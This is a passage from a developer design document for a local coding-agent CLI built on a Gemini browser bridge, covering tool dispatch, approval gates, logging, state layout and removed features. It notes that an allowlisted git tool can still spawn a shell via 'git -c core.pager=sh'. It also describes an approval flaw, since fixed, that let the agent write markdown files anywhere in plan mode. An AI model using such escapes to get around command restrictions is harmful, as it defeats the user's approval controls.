come back to the model as an unknown tool it had just been told it has. `LOOP_TOOLS` is derived
from the catalog now, so the two cannot disagree.

**The drift check caught the move, which is the point of it.** `LOOP_DISPATCHED` in
`tool-catalog.test.js` scrapes the dispatching source rather than deriving from the catalog —
derived, it would be comparing the catalog to itself. It went red the moment the arms left
`agent-loop.js`, and it now reads `loop-tools.js`. **The file it reads must be the file with
the implementation in it.**

`core/diff-approval.js` holds what happens between building a diff and it being on disk. Three
parties have to be told the same thing about that, and each has been the odd one out: the model
(told `pending_approval` about a file already written), the screen (a rejected edit drawn in
green), and the disk (the only one never wrong). Keeping them in one function is the reason it
is one.

**A mechanical extraction tried to drop a line and the comments are why it did not.**
`manage_memory` computes its result and *then* calls `resetPromptState()` — the facts ride
inside `<memory>` in the system prompt, so a changed set is invisible until that prompt is
rebuilt. A regex turning `result = x` into `return x` deletes the call silently, and the tool
goes on reporting "Remembered:" for facts the model will never see. Written by hand instead,
and `loop-tools.test.js` asserts the reset on both paths and its *absence* on a rejected action,
which would otherwise spend a full turn-0 payload to change nothing.

**Plan mode exempts the agent's own artifacts, and nothing else.** The check was
`path.endsWith('.md')`, beside a comment reading "Creating/Editing Markdown files (like plans)
is harmless". The intent was real — `task.md` and `plan.md` are files the system prompt *tells*
the model to keep current, and it cannot do that if every tick needs a keystroke. But the test
was the **extension**, not the **location**, so in plan mode the agent could silently write any
markdown anywhere: `README.md`, `CLAUDE.md`, and `AGENT.md` — the one file this project promises
"can always be trusted to say what the human wrote" — plus anything outside the workspace,
because these tools accept absolute paths.

Reported from use: `create_file test-agent-cli.md` in plan mode returned `"status":"applied"`.
Meanwhile `prompt-builder.js:362` tells the model *"All file modifications and command
executions require user approval before being applied"* and the status row reads *"plan — every
edit needs approval"*. **The model was told the truth and the enforcement was not doing it** —
which is the worst arrangement of the three, because nothing on screen or in the prompt gives
you any reason to doubt it.

`isAgentArtifact` resolves the path and prefix-checks it against `paths.artifactsDir`, because
the model supplies that string: `task.md`, `./task.md`, an absolute path and
`.agent/artifacts/../../../task.md` are one string test and four different files. It fails
closed — anything unresolvable, or outside, needs approval.

### Subagents

`AgentLoop.topology` is `single` | `duo`, derived from whether a reviewer is set.
`ask_reviewer` / `ask_researcher` / `ask_subagent` run **in parallel** (see the `isParallel`
list in `_executeToolCalls`), each in a *different browser tab* on its own `sub:<requestId>`
lane. `_runSubAgentSession` gives subagents a restricted tool set.

**Duo is two Gemini tabs, not two models,** since ChatGPT was removed. What the reviewer
contributes is not different weights: it is a reader with **no memory of the conversation that
produced the work**. That is the half that matters for the failure it exists to catch — a model
that reads enough to cite and then reasons from the citation instead of reading on. A cold
reader has nothing to reason from but the file, so it opens the file. The `reviewer !== main`
guard that used to forbid this was written when two same-model requests raced for one tab; tab
identity fixed that, and the guard outlived its reason.

### Context engine

`context/` — `code-minifier`, `context-manager`, `memory-manager`, `symbol-index`. `CodeMinifier.minifyJson` is on the hot
path: `PromptBuilder.buildToolResultBatch` embeds every tool result in the next prompt, and
serialising them compact rather than pretty-printed is ~40% fewer characters there — measured
on a 30-entry `list_directory` shape: 2,456 pretty against 1,424 compact, **42%**.

**Nothing had ever called it from a test, and two things were wrong behind that.** Every
fixture in the suite passed a *string* result, so the branch that serialises an object was
never taken — while real tool results are mostly objects. `undefined` came back as `undefined`
rather than a string, under a `@returns {string}` annotation, and the caller reads `.length`
off it, so the whole prompt build throws and every other result in the batch dies with it.
Worse, **a cycle or a BigInt threw, was caught, and returned `''`** — the model handed a tool
that ran and produced nothing, which is a confident wrong answer where the other is merely a
dead turn. A replacer keeps what can be serialised and marks what cannot.

Neither was reachable from a path traced today — every `ask_question` resolver passes a
`result` — so this is a contract made true rather than a reported bug. The doc already promised
a caller could "pass it anything a tool handler might have produced".

There is no `ast-chunker` and no `skills/` registry any more. Both were written, never wired to
anything, and removed on 2026-09-10: the chunker resolved 24% of this repo's top-level symbols
(it walked only `ast.body`, so every class method and every `export const foo = () => {}` missed,
and plain acorn cannot parse the `.jsx` files at all), and `SkillRegistry` was a second, parallel
way to declare a tool that competed with `mcp/mcp-server.js`'s `TOOL_DEFINITIONS` — which is the
one described above and the one that actually runs. A per-symbol read tool is still a real gap;
it wants `acorn-walk` plus `acorn-jsx`, not that file.
`watcher/file-watcher.js` (chokidar) invalidates context on external edits. `semantic_search`
is backed by a local TF-IDF index.

### GitHub agent — removed 2026-09-19, documented to be rebuilt

Deleted on the owner's call: *"delete github for now, maybe we will have it
later so document the things as they are today."* 2,009 lines in
`server/src/github/`, plus a tab, two hooks, a content script and eight test
files — 8% of the server source for a second product living inside the first.

**Why it went.** Every `flow: 'github'` entry in the error log was `poll: fetch
failed`. Three review directories were ever written. The tab showed comments
stuck at `⚠ not analysed` after being sent for analysis, with no way to tell
"still working" from "silently failed" from "done, and the row is stale". And
it was competing for attention with a core loop that produced six separate
"the prompt promises what the code refuses" bugs in a single day.

Not deleted because it was bad. Deleted because a half-working second product
costs more than it returns while the first one is still being made to work.

#### What it did

| file | lines | job |
| --- | --- | --- |
| `github-poller.js` | 476 | polled the REST API for PRs, comments and workflow runs |
| `github-event-handler.js` | 380 | orchestrator wiring the poller to everything below |
| `review-writer.js` | 376 | wrote one `.md` per comment into `.agent/github-reviews/PR-<n>/` |
| `ci-log-parser.js` | 198 | pulled the actionable failure out of an Actions log |
| `github-review-prompt.js` | 166 | the system prompt for investigating a comment |
| `review-task.js` | 162 | turned one comment into one prompt |
| `work-queue.js` | 119 | what to analyse and when — knew nothing about GitHub |
| `comment-classifier.js` | 70 | which comments were worth a pass |
| `github-config.js` | 62 | token, repo, intervals |

Surfaces: `ui/components/GithubTab.jsx`, `ui/hooks/use-github-tab.js`,
`ui/hooks/use-github-keys.js`, `^o` to open the tab, `/github` and its
subcommands, `extension/content-scripts/github-bridge.js` for reading comment
bodies off the page.

#### The decisions worth keeping, if it is rebuilt

- **The tab is for browsing; the stream is for noticing.** Every new event also
  arrived in the transcript as one dim row (`githubNoticeRow`), because that is
  where you are already reading. Nothing interrupted, nothing was inserted into
  the prompt. The author was capped at 20 characters: a GitHub username runs to
  39, and the row is drawn in the *live* frame, where 78 columns is one row at
  80 and two at 72 — and a row that wraps is charged as one and drawn as two.
- **One list, three levels.** PRs → that PR's comments → the analysis in your
  editor, where `⏎` means "go deeper" at every level and `esc` comes back. It
  had been *two* lists — an activity feed you landed on and a PR explorer behind
  an unadvertised `p` — showing overlapping things, with `⏎` meaning something
  different on each of three screens. The feed was also empty on a fresh session
  with open PRs sitting right there, because it only ever held events from that
  process. `summarisePrs` folded the feed into "what does the agent know about
  each PR", which is what the rows counted.
- **`height={rows}` with `overflow="hidden"`, budgeted at `terminalHeight - 3`.**
  The banner is a `<Static>` item and cannot be cleared, so the screen has to
  push it off; remounting `<Static>` to lose it reprints the whole transcript,
  which is where a second banner came from. `- 2` looks exact and costs one
  `ESC[2J` on the way back, because Ink's frame carries a trailing newline the
  row count does not.
- **No box and no inner scrolling.** The only box-drawn frame in this product is
  the input field, where the border *means* the mode. The list was windowed
  against the budget and said what it trimmed (`… N more`).
- **The agent had no shell.** `runHeadlessTask` offered only `grep_search`,
  `read_file`, `list_directory`, `search_files` and `ask_subagent`, so it could
  not run `git checkout` whatever it was asked — a structural guarantee, not a
  prompt rule. Rebuild it that way.

#### What was still broken when it went

- **Comments sent for analysis never updated their row.** Unknown whether the
  analysis ran, and unknown whether a plan file was written. Start by comparing
  the tab's `activity` against what is on disk in `.agent/github-reviews/`.
- **The reviewer could not see git.** The prompt handed it a title, a number, a
  branch *name*, the comment and a diff snippet — no current branch, no
  divergence, no merge base. So "why is there a merge conflict", which is what
  people actually asked it, was unanswerable. The fix is two parts: put the git
  facts in the prompt (the server computes them; `rev-list --left-right --count`
  is the diagnostic), and only then consider an allowlisted read-only `git`
  tool. An allowlisted `git` is still a shell unless `-c`, `-C` and
  `--exec-path` are refused: `git -c core.pager=sh` runs `sh`.
- **`.agent/github-reviews/` and `/plans` meant two different things.**
  `migrateGitHubReviews` in `core/migrate.js` renamed the older
  `github-pr-plans/` and refused to clobber; that migration is kept.


### Where `.agent/` actually is

`workspace` used to mean two things: where state lives, and what the agent works on. In a
monorepo those come apart, so `paths.resolveState(workspace)` walks *up* looking for an
existing `.agent/`, the way git finds `.git`. The first hit is the **root**; the path from it
down to the workspace is the **scope**.

```
/base-repo/.agent/             root — shared by every repo
├── skills/  config.json                            inherited
├── repo-1/   artifacts/ state/ sessions/ logs/     this repo only
│             config.json (overrides)
└── repo-2/ …
/base-repo/AGENT.md            instructions for every repo under it
/base-repo/repo-1/             the code, with no .agent of its own
/base-repo/repo-1/AGENT.md     instructions for this repo — nearest wins
```

Nothing found — the ordinary single-repo case — and the root is `<workspace>/.agent` with an
empty scope, byte-identical to the old behaviour. Opening `/base-repo` and opening
`/base-repo/repo-1` land on the same state, because both walks end at the same root;
`workspaceSlug` is keyed on the resolved state dir for exactly that reason, so siblings don't
collide on one history file.

Scope is **explicit, never inferred from which files the agent touches**, and **chosen at
launch**: `--scope repo-1`, or just open the repo directly. Shown in the status bar. Tools stay
rooted at the workspace so cross-repo work is still possible — only state, sessions and config
are scoped. `/scope` still answers, but only to say where you are and how to change it.

**The landmine:** `homeDir()` is `~/.agent`. A naive upward walk from any project under `$HOME`
finds it and would adopt the global home as a project root, pooling every project's state and
leaking every project's rules into everyone else's prompt. `resolveState` excludes it and stops
walking at `$HOME`; `paths.test.js` covers it.

| Path | Contents |
| --- | --- |
| `<ws>/.agent/config.json` | topology, `modelConfig`, `commandRules`, `memoryEnabled`, `agentName`, GitHub token |
| `<ws>/.agent/memory.md` | what the agent learned here — scoped, never walked, read back into `<memory>` |
| `<ws>/.agent/artifacts/` | `task.md`, `plan.md`, `walkthrough.md` — written for the user to read |
| `<ws>/.agent/state/` | `editor.json` (VS Code companion), `github.json`, `plan-approval.json` |
| `<ws>/.agent/github-pr-plans/` | GitHub PR agent output |
| `<ws>/.agent/logs/errors.jsonl` | structured failure log — one JSON object per line |
| `<ws>/.agent/logs/commands/<date>.jsonl` | every shell command run, blocked or rejected — an audit trail, never read back into a prompt |
| `<ws>/.agent/backups/`, `context/`, `logs/`, `tmp/` | see `paths.js` |
| `<ws>/.agent/sessions/history.jsonl` | conversation history, local copy |
| `~/.agent/workspaces/<name>-<hash>/history.jsonl` | the durable copy of the same history |

**A session with no user turn is not filed.** `watcher/file-watcher.js` appends
`[System Event] File X was modified` turns whenever anything on disk changes, so leaving
the agent open while editing in another window manufactures history containing no prompt.
Filing those put **6 of 19** rows into a real `/history` picker, every one reading
`Untitled` with a turn count and nothing to tell them apart — a third of the list was
watcher noise, in a picker whose only job is choosing. Dropped rather than titled better,
because a better title is still a row offering to restore a transcript of file
notifications.

**Session history is written to both copies on every turn** (`storage/session-store.js`). The
workspace copy sits next to the code; the home copy survives a clean checkout or a wiped
`.agent/`. On startup the two are reconciled — more turns wins, the other is rebuilt from it.

`AGENT_CLI_HOME` overrides the home dir, which is `~/.agent`. The pre-rename `GEMINI_AGENT_HOME`
and the older `AGENT_HOME` are still read, because dropping them would silently repoint an
existing install rather than fail. It is
deliberately **not** `~/.gemini`: that belongs to Google's Gemini CLI and Antigravity, which
really do keep data there.

`core/migrate.js` folds the pre-`.agent` layout (`.gemini/`, `.gemini-agent/`, `~/.gemini-agent/`,
`.agent-github-plans/`, root `setAgentName.json` / `agent.log`) into `.agent/` on startup. It
runs only when `.agent/` is absent, moves rather than copies, and is a no-op on the second run.

**Those three claims are now assertions** (`test/core/migrate-workspace.test.js`), because the
module moves the user's data — config, instructions, backups, logs — on startup, before
anything is on screen, and it sat at **46% line coverage** with one narrow rename tested. Same
combination as `diff-engine.js`, which was 358 lines with no tests and was writing backups
outside the backup directory.

Nothing was wrong: all four behaviours were probed against the real code first and all four
held. What the tests buy is that the failure mode is silent and unrecoverable — a migration
that clobbers has already destroyed the thing it overwrote by the time anyone looks. The one
that would hurt most is `rules.md` → `AGENT.md`, the only move that writes into the user's
*tracked* tree; the test asserts both that a human-written `AGENT.md` survives **and** that
declining to move it does not delete the source instead. Coverage 46% → 70%.

**A wrong fixture made correct code look broken first.** The first probe put sessions in
`.gemini/sessions/`, which never existed — they lived in the *home* directory, and
`migrateHome` handles them. The fixture has to come from the migration's own plan, not from
memory of what the old layout probably was.

`vscode-companion/extension.js` duplicates the `.agent` constant — it cannot import from
`server/`. Changing `AGENT_DIR` in `paths.js` means changing it there too, then repackaging
the `.vsix`.

The companion and the CLI talk only through files under `<ws>/.agent/state/`, never a socket:
`editor.json` (active file and cursor), `diagnostics.json` (the Problems panel, debounced 1.5s
because `onDidChangeDiagnostics` fires continuously while a project indexes),
`chat-queue.jsonl` (append-only; "Add to Agent Chat" selections, drained by `ui/chat-queue.js`),
`plan-review.json` (comments accumulated while reviewing) and `plan-approval.json` (the
submitted verdict: `accept` | `changes_requested` | `reject`). Files rather than a socket is
what lets the extension queue work before the CLI is even running.

### Failure logging

`core/error-log.js` writes every failure to `<ws>/.agent/logs/errors.jsonl`, tagged with the
flow it came from (`bridge`, `extension`, `agent`, `tool`, `github`, `task`, `diff`, `context`,
`ui`). `/logs` reads it back grouped by flow; `/logs <flow>` drills in.

It exists because failures here are spread across processes that cannot see each other — a
content script in a Chrome tab, the bridge, the loop, the tools, the poller — and the symptom
surfaces far from the cause. The console was the only sink, and console output inside an Ink
app is destroyed by the next repaint.

Two properties are load-bearing. It **never throws** (every caller is already on a failure
path). And it **collapses repeats**: identical failures inside a 60s window are counted rather
than written, because a poller failing every tick used to bury everything else. The tally is
written as its own record marked `tally: true` when the window closes or the process exits —
so a storm of 500 shows as 500, not 1, and the tally line is never miscounted as another
occurrence.

### The command log

`core/command-log.js` appends every `run_command` to `<ws>/.agent/logs/commands/<date>.jsonl`,
whether it ran, was blocked by the risk classifier, or was rejected at the approval prompt.
`/commands` reads it back; the Status tab shows today's count.

Nothing reads it into a prompt and nothing acts on it. It answers "what has this thing actually
been doing on my computer?" for the person whose computer it is, and it is not covered by
anything else here:

- `errors.jsonl` records **failures**, by flow. `git push --force` does not fail, so the one
  command you would most want to find is the one that log never sees.
- `sessions/history.jsonl` has tool calls mixed into the conversation, and `/compact` replaces
  older turns with a summary — the record you would want six weeks from now is the first thing
  compaction throws away.

One file per day, because that is how people look for this ("what did it do on Tuesday"), with
a per-process session id inside so a day can be read back session by session. Append-only, and
`logCommand` never throws: a failure to write the audit log must not fail the command.

**Blocked commands are the most worth keeping, not the least.** What the agent *tried* to do is
the interesting half — a `critical` verdict from the classifier is exactly the line someone
would want to see later.

## Branching and PRs

**Never commit or push to `main` directly. Work lands on a branch and merges through a PR.**

The branches in this repo are deliberate: they are the history. `beta-v1` … `beta-v10`,
`fix/bridge-lock-and-cli`, `v1-stable` are kept on purpose, not left behind. Do not delete
them, and do not squash their history away.

- Branch from `main`, name it for the work (`fix/…`, `feat/…`, or the next `beta-vN`).
- Open a PR into `main`. That is the only way work reaches `main`.
- A force-push to `main` is not a merge and is not covered by this: it is a repair, it needs
  the owner to ask for it explicitly, and it breaks every open PR targeting `main` plus every
  existing clone.

A conflict on a PR that *should* be a clean descendant almost always means the two sides no
longer share history — check `git rev-list --left-right --count main...<branch>` locally
before believing GitHub. If local says `0 <n>` and GitHub says conflicts, the remote branches
have diverged (a rewrite that was pushed to one side and not the other), and the fix is to
make both sides share the same base, not to resolve 120 files by hand.

## Product decisions

Standing constraints on this project. These are choices, not limitations to route around:

- **Gemini Web only.** Not "primary target" any more — the only one. ChatGPT was removed on
  2026-09-19 (see the removal note below); a second provider is a decision to re-open, not a
  file to un-delete.
- **Purely local** — no hosted backend, no telemetry, no API keys. Inference happens in the
  user's own browser session, which is the whole point of the extension bridge.
- **Two front-ends** — the terminal CLI and the Chrome side panel are both supported surfaces.
- **One answer per turn** — never emit drafts or A/B alternatives for the user to pick between.
- **One bridge.** This used to read "the two bridges stay separate" — ~600 duplicated lines
  across `gemini-bridge.js` and `chatgpt-bridge.js`, kept apart because collapsing them risked
  breaking both at once, and defended by jsdom tests that ran against *both* files so a
  divergence failed the build. Deleting one settled that argument by removing its subject. The
  jsdom tests still run, against the one bridge, and say in a comment **not** to restore a
  second target to make the comparison mean something again: the comparison was a side-effect
  of having two, never a reason to have two.
- **An API backend is a fork, not a plan.** It would remove the ceiling — structured tool
  calls, real parallelism, caching, and `looksLikeCapabilityDenial` plus half of
  `PromptBuilder`'s economics become dead code — and it contradicts "no API keys" above,
  which is the identity of the project. The framing that preserves the thesis: the browser
  bridge stays the default, an API backend is opt-in for people who already have a key.

### ChatGPT removed, 2026-09-19

Owner's call. It makes the code match a product decision that was already standing and retires
the caveat that was attached to it. `extension/content-scripts/chatgpt-bridge.js` is deleted;
eleven other files lost a line or two each. What is worth keeping is the parts that were **not**
mechanical:

- **Duo survived by changing meaning.** With one model, `reviewer !== main` meant no reviewer at
  all. See "Subagents" above for why a second Gemini tab is still worth having — and why the
  guard that forbade it had outlived its reason by the time it was removed.
- **An old config is folded on read, not left alone.** `_saveConfig` deliberately preserves keys
  it does not own, so a stored `modelConfig.main: 'chatgpt'` survives every save and points the
  agent at a site with no bridge, silently. `_loadConfig` folds it — reading from the **on-disk**
  object, not the merged one, because the merge's defaults would shadow the legacy key. That is
  the same mistake `config-merge.test.js` already covers for `effort`, and the negative control
  matters as much as the fix: a ChatGPT main with **no** reviewer must stay solo, or folding
  turns every solo session into a duo one.
- **Old sessions need no migration, and that is a claim with a test.** A session filed before the
  removal carries `thread: {model: 'chatgpt'}`. `sameThread` compares model *and* id, so it
  resolves to `replay` rather than `continue` — the honest answer, because the conversation still
  exists and nothing here can reopen it.
- **The jsdom tests lost their reason and kept their value.** They ran against both bridges so a
  divergence failed the build. The comment in them now says not to restore a second target to
  make that loop mean something again.
- **`content.js` is bundled.** `npm run build --workspace=extension` before committing, or Chrome
  loads the old `service-worker.js` and none of it is real.

### Standing decisions rescued from `HANDOFF.md`, 2026-09-20

That file was a baton — "delete this once the work below is done" — and its work
is done or obsolete: three of its eight open items were GitHub-agent work deleted
in `e375aed`, `/update` has now run against a real merge, `ask_subagent` is
verified (`4b520b9`), and `/logs rates` has its data. What it also held, and
nothing else did, is these. They are decisions, so they belong here.

- **No reply envelope** — asking the model to wrap replies in JSON. Argued from
  measurement, and the price is the case against it: the browser tab stops being
  readable to the person watching it, which is a *supported surface*;
  `gemini_response_stream` can no longer render live, because JSON cannot be
  drawn until it closes and parses; every reply becomes as fragile as
  `_cleanJsonString` already is, since prose is exactly what escaping gets
  wrong; and it is more text typed into a browser every turn, against a prompt
  strategy that exists to avoid exactly that. The three drift detectors look
  like candidates and are not — a provider error is Gemini's own error page
  rather than model output, and a model confused enough to deny its own tools
  will not emit a correct marker saying so. **If it comes back**, the thing
  worth doing instead is a short output-contract line asking for the constructs
  the renderer handles best.
- **The jitter's second half is not happening** — ~20% of the live frame spent
  on the seam that brought the scroll glitches back twice.
- **Terminal failures are opt-in per terminal**, chosen over an age filter.
- **The emoji sweep is not happening.** ~100 glyphs across 16 files were changed
  and then reverted; the only real complaint was the tick on a dark background,
  which is now `✔`. Change a glyph when someone names *that glyph* — `✅` → `✓`
  on the compaction row was right, and re-running the sweep is not.

And two traps that were only written down there:

- **A test can pin the bug.** A list-indent fix failed two tests that asserted
  the broken two-space indent. A test written from observed output describes
  what the code *does*, which is not what it *should* do — and it will defend
  the bug.
- **Do not write a derived number into a document here.** Commit counts and test
  counts both drifted within a day. Print the command instead.

### Removed as dead, 2026-09-16

Found by auditing every export for a caller. Recorded because "why is this gone?" is a
question someone asks six weeks later, and because two of them were not simply unused.

- **`context/token-counter.js`** — a whole 30-line class, `TokenCounter`, reachable from
  nothing. Its only remaining mention was a *comment* in `agent-loop.js`. Token estimation
  moved to `contextChars` counted where it crosses the bridge, which is the one place that
  cannot be wrong about it; the class was left behind.
- **Five `paths.js` exports** with no caller anywhere, including inside `paths.js`:
  `contextSummaryPath` and `globalContextPath` (leftovers of the retrieval subsystem deleted
  in Direction phase 1), `skillPath`, `REL_ARTIFACTS_DIR`, and `planReviewPath`. The last one
  is worth a word: the companion *does* write `plan-review.json`, but that is its own draft
  state while you are commenting, and the comments reach the CLI inside
  `plan-approval.json`. The path helper was the dead part, not the feature.
- **The side panel's context meter** — markup, CSS and `updateContextBar()`, which nothing
  called. Worse than unused: the server never sends token counts to the panel at all, so the
  bar read a permanent **0%** while your context could be at 90%. A meter that is always
  wrong is worse than no meter, and the CLI has the real one in its status bar. Putting it
  back is a feature — it needs a new message type — not a missing call.
- **Three test seams that no test used** — `__tabLanes` and `__sessionTabs` in the
  extension's `content.js`, and `resetSymbolIndexes`. Written in the same commits as the
  things they were meant to test, and then not needed. A seam nobody pulls is API surface
  with no reason to exist.

**One thing the audit found was not dead but unwired.** `rememberWorkspace` had no callers,
which meant nothing ever wrote `recent-workspaces.json` — so `listWorkspaceCandidates`'s
`recent` category, which reads that file and has always been in the `/set-workspace` picker,
silently offered nothing. The reader, the writer and the picker row all existed; the call did
not. `main.js` makes it now, after the workspace existence check, so a path that does not
resolve is not offered back as somewhere you have been. Verified: 0 recents before, 2 after.

**The side panel's dropped messages — two of them were a hang, fixed 2026-09-16.** The
count was worse than "at least three", and the ones that mattered were not the cosmetic
ones. `ask_question` and `request_command_approval` both park the turn on
`await new Promise(...)` with **no timeout**, send the prompt through `sendToPanel`, and
wait. The panel rendered neither — and there was no inbound message type it could have
answered with even if it had. So a turn driven from the panel stopped dead at the first
question or first risky command, and because the panel disables its send button behind
`isWaitingForResponse` until a reply arrives, it then accepted no further prompts at all.
The reported symptom was "the sidebar doesn't send prompts".

The resolvers already existed and were already careful — `cancelQuestion` resolves rather
than rejecting, precisely because leaving the promise pending *is* the hang. Only the way
in was missing: `question_response` and `command_approval_response` are now inbound cases
on the bridge, relayed by the worker, with the panel drawing both.

`response_stream` is handled too, so the panel no longer sits on "Thinking…" for a whole
turn and then jumps to the finished answer.

`github_plan_generated` is handled too, as one line. **The list of what else the panel
"drops" was wrong, including the version of it written earlier the same day** — it came
from grepping `type:` across the server, which counts things that are not panel messages
at all. Checked properly: `github_notification`, `github_processing_started` and
`github_processing_finished` are pushed to `pendingGitHubNotifications`, a **CLI-only
buffer drained by a getter**, and never broadcast — so there is nothing reaching the panel
to drop. `compaction_summary` is a `conversationHistory` entry, not a message. Of the whole
apparent list, exactly one type was really arriving and being ignored.

`inject_prompt`, `end_session` and `heartbeat_ack` are addressed to the worker and the
content script, and the panel is right to ignore them.

The method matters more than the correction: **a grep for `type:` finds message-shaped
literals, not messages.** Follow the value to the `broadcast` call before believing a
surface is missing something.

**The lesson worth keeping:** a surface that ignores an unknown message type is not
equally harmless for every type. Dropping a *notification* costs a missing line; dropping
a *request* deadlocks whatever is waiting on the answer. When adding a message the agent
loop blocks on, every front-end needs a way to reply — or a timeout.

An old `.agent/config.json` can also carry `contextFolders` and `modelConfig.reasoner`,
fossils of features deleted in Direction phases 2 and 7. Nothing in the source reads either.
They are left in place on purpose: config saving deliberately preserves keys it does not
own — that was a bug fix — and auto-pruning known-dead keys would fight it for no gain.

**`figlet` is gone; the one font it was used for is vendored.** It was 20.8MB — 328 fonts
across `fonts/` and `importable-fonts/` — and this app rendered exactly one, `Standard`, for
the wordmark: **21% of `node_modules` for a banner**. The font is 30KB in `ui/fonts/` and
`ui/figfont.js` renders it. Measured: `node_modules` **98.5MB → 77.2MB**.

Only what `Standard` needs is implemented. Its header sets horizontal smushing with rules 1,
2, 4 and 8; the vertical rules it also sets never apply, because the banner is one line.
Correctness was not argued, it was compared — while `figlet` was still installed, **25,110
strings** (every printable character alone, the banner, and 25,000 random strings of 1–12
characters) were rendered through both and required to match byte for byte.

Two things that comparison caught, neither of which would have been found by looking:
the shipped `.flf` files are **CRLF**, so splitting on `\n` leaves a `\r` as each row's
"endmark" and strips nothing — every glyph keeps its `@` and none of them overlap. And a row
where one side is **entirely blank** cannot collide, so it must not limit the slide; counting
its blanks drew `7,` and `W.` one column too wide. That was the difference between 3,106 and
3,110, and then 25,110 of 25,110.

The banner was also being rendered **twice** — a synchronous render to seed the state and an
async `figlet.text` in an effect that recomputed the same string on mount. The async half was
pure duplicate work and went with the dependency.

**`@inquirer/prompts` went too** — sixteen packages for one yes/no that fires only when the
port is taken. `node:readline/promises` does it in six lines. Measured: another **4.4MB**,
more than the 0.6MB the top-level directory suggested, because of what it pulled in behind it.

**Code blocks are drawn plainly whichever way they were written.** `renderMarkdown` lifts
*fenced* blocks out before `marked` sees them and draws them with `renderBlock`; an *indented*
block never matched that lift and fell through to `marked-terminal`, which highlights it. The
result was backwards — the shape this project controls and designed for came out plain, the
rare untagged four-space shape came out coloured. Measured with colour forced: fenced 6 ANSI
spans, all of them rules; indented 14, with the number green. A `code` renderer now draws both
the same way. It is overridden rather than lifted out by regex because four-space indentation
is also how a list continues, and `marked` can already tell those apart.

That makes `highlight.js` unreachable — **4.3MB and ~60ms of startup for output that can no
longer be shown** — but it is a transitive dependency of `marked-terminal`, so removing it
means replacing that renderer. `format.js` already overrides lists and code; what remains is
headings, tables, blockquotes, emphasis, links and rules. Left as a deliberate choice, not an
oversight.

**Total: `node_modules` 98.5MB → 72.7MB.**

**Dependencies: none unused.** Every entry in all four `package.json` files is imported,
used in a script, or `@types/react`, which is types-only and exists for editor JSX
intellisense. `@inquirer/prompts` looks unused to a naive grep and is not — `main.js` reaches
it through `await import()` on the `EADDRINUSE` path. `chalk` was the one genuinely dead
dependency and went earlier the same day.

### Measured and discarded

Kept so they are not re-tried.

- **The extension's "address theory" was wrong.** The reconnect, not the address, was the
  whole connectivity problem. With the shipped bundle refusing every handshake: attempts at
  4.7s, 20.7s, 50.7s, 80.7s — steady state **exactly 30.0s**, the `chrome.alarms` clamp
  floor. Headless Chrome reclaims service workers harder than a real browser, so that is a
  lower bound rather than a verdict.
- **The anti-throttling audio hack never worked, and not for the reason three documents
  recorded.** They said the `<audio>` element was created and never appended — true, and not
  the bug, because a detached `<audio>` plays fine in Chrome. The real reason is in its own
  catch block: autoplay policy blocks playback without a user gesture, and the fallback bound
  `click`/`keydown` with `{ once: true }`, which a **backgrounded** tab never receives. So it
  played in tabs that did not need it and stayed silent in the ones it existed for. Deleted;
  the Tab Wakeup Protocol is the mechanism that works.
- **The batch loop's flat re-serialisation was diagnosed as an oversight and was not.** Every
  batch turn opened a fresh tab closed when the turn ended, so turn 2 had never seen turn 1 —
  there was no thread to opt into. Measured at **81% resent** over ten turns (156,140
  characters where 28,943 were new) before the tab was held for the life of the task.

## Direction

Agreed 2026-09-10, not yet built. Recorded so the reasoning is not re-derived.

**The problem being solved:** seven mechanisms exist for "tell the model about this project"
(`AGENT.md`, `.agent/rules.md`, scoped `rules.md`, `skills/`, `memory.json`, `mistakes.md`,
`contextFolders`). Phases 2 and 3 leave two: `AGENT.md` and `skills/`, plus `memory.md`, which
is the agent's own notes rather than a place you tell it anything. with six different discovery rules between them. The count of *rules* is the
mess, not the count of files.

**The target:** two axes, one mechanism each.

| axis | question | mechanism |
| --- | --- | --- |
| scope | who does this apply to? | **where the file is** — walk up from the code, nearest wins |
| cost | always in context, or on request? | **which file** — `AGENT.md` vs `.agent/skills/` |

Repo-specific knowledge is *not* a skill. A skill's contract is "read me when my description
matches"; repo conventions match *always* when you are in that repo, and encoding "always" as
"when relevant" hands the model a judgement it will sometimes get wrong — after it has already
edited something. The test: *should the agent know this before its first action in this repo?*
Yes → `AGENT.md`. Fine to discover later → skill.

Memory is **scoped and never walked** (`.agent/<scope>/memory.md`), kept separate from
`AGENT.md` so that file can always be trusted to say what the human wrote. Promoting a learned
fact to a standing instruction is a manual edit, deliberately.

| Phase | Change | Removes | Status |
| --- | --- | --- | --- |
| 0 | `codeDir`; `AGENT.md` and skills read from the code location, not the workspace; watcher scoped | — (bug fixes) | **done** `5513557` |
| 1 | Delete `semantic_search` + `workspace-indexer` + `workspace-summarizer` + dead `ContextManager` code | ~290 lines, `madge`, the startup index build | **done** `0b93bf6` |
| 7 | Two bridges only; drop the Claude bridge, `swarm`, `ask_reasoner` | ~520 lines, 14 DOM selectors | **done** `8e60a24` |
| 2 | One instruction surface: `AGENT.md`, walked | `rules.md`, `mistakesPath`, `/init-skills`, `contextFolders`, `/context add\|remove\|list` | **done** |
| 3 | Memory as `.agent/<scope>/memory.md`, bounded in the prompt | the write-only trap | **done** |
| 4 | One model picker, five valid states, `/reasoning` → `/effort` | `reasoningEffort`, `_effortToTier`, `modelTier`, `reasoningLevel` as stored keys | **done** |
| 5 | Keep `--scope` and derived resolution; delete the runtime switcher | `/scope`'s picker, `setScope`, `listScopes`, the reload path | **done** |
| 6 | Per-model extension lock; derive topology from `modelConfig` | `topology` as a knob, `/mode`, the mode menu, the two-step config picker | **done** |

**What phase 2 kept (phase 2).** Bare `/context` survives as what its name says — a report of
what is in the window. Only `add|remove|list` went: registering folders of `.md` files was a
second way to give the model standing instructions, and that is the thing being removed, not
the ability to ask what the prompt currently costs.

Retired files are **named, never moved**. `.agent/rules.md` and `.agent/mistakes.md` stop being
read, and `runMigrations` prints one line saying so (`retiredInstructionFiles` in `core/migrate.js`).
Folding them into `AGENT.md` automatically was the obvious move and is wrong: `AGENT.md` is
usually tracked in git, so the agent would be writing an unasked-for diff into the user's repo on
startup — and CLAUDE.md's own rule is that `AGENT.md` can always be trusted to say what the human
wrote. The pre-`.agent/` migration path is the exception: `.gemini/rules.md` moves to `AGENT.md`
because `move()` refuses to clobber, so it only lands where there is no `AGENT.md` to disturb.

**The write-only trap has happened twice, and the second one was found by using the
product.** `.agent/artifacts/task.md` is the same shape: the system prompt tells the model to
create a checklist and tick items off, the file is read only by `App.jsx` to draw a row, and no
prompt ever carried it back — verified absent from turn 0, from every tool-result turn, and from
